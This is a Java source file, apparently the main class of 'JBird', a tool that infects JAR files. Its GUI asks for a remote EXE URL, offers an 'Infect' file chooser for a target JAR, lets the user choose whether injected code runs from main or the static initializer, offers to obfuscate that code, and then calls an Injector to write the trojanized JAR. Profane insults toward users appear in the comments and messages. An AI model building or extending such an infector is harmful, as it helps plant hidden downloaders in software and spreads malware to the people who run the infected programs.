import util.misc.Settings;
import util.misc.UI;

import javax.swing.*;

public class Application {
    public static void main(String[] args) {
        /*
        double ver = Network.getLatestVersion();
        if(ver > Settings.VERSION || ver == -1){
            close("Application is out of date or disabled.");
        }*/
        System.out.println("Starting JBird v" + Settings.VERSION);
        System.out.println("Created by Contra. Visit RECoders.org");
        String url;
        String mname;
        String file = null;
        boolean obfuscate;
        String obinput;
        String appinput;

        if (args.length > 0) close("Don't try to use the command line shithead");

        /* STUPID FUCKING USER INPUT FOR NOOB DUMBASSES */
        url = JOptionPane.showInputDialog("Remote EXE:", "http://example.com/test.exe");

        //File Selector
        JFileChooser chooser = new JFileChooser();
        chooser.setFileFilter(UI.getGenericFilter("jar"));
        if (chooser.showDialog(null, "Infect") == JFileChooser.APPROVE_OPTION) file = chooser.getSelectedFile().getAbsolutePath();

        //App Type
        String[] appchoices = {"Standalone Program", "Script/Plugin/Other"};
        appinput = UI.getComboInput(appchoices, "Program Type", "Please select the type of program");
        mname = appinput != null && appinput.equals(appchoices[0]) ? "main" : "<clinit>";

        //Obfuscation Options
        String[] obchoices = {"Obfuscate", "Don't Obfuscate"};
        obinput = UI.getComboInput(obchoices, "Obfuscation", "Would you like to obfuscate injected code?");
        obfuscate = obinput != null && !obinput.equals(obchoices[1]);

        if ((file == null) || (url == null) || (appinput == null) || (obinput == null)) {
            close("Missing input. Please fill in all fields appropriately.");
        }
        Injector inf = new Injector(file, url, mname);
        inf.load();
        inf.inject();
        if (obfuscate) inf.obfuscate();
        inf.save();
        close("Process Completed!");
    }

    public static void close(String msg) {
        System.out.println(msg);
        JOptionPane.showMessageDialog(null, msg);
        System.exit(1337);
    }
}
